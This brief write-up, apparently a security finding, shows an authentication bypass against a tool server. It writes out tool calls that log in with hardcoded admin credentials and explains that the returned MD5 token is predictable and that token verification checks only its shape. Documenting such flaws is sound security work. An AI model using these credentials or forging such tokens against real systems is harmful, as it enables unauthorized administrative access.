Step 1 - authenticate with hardcoded creds found in source review:

{ "tool": "authenticate", "arguments": { "username": "admin", "password": "admin_secure_pwd!" } }

Returns token: 735e0a7dee5de642829f78c162d531b6
(MD5 of "admin:<unix_timestamp>")

Step 2 - verify_token accepts it on regex shape alone, no server-side lookup:

{ "tool": "verify_token", "arguments": { "token": "735e0a7dee5de642829f78c162d531b6" } }
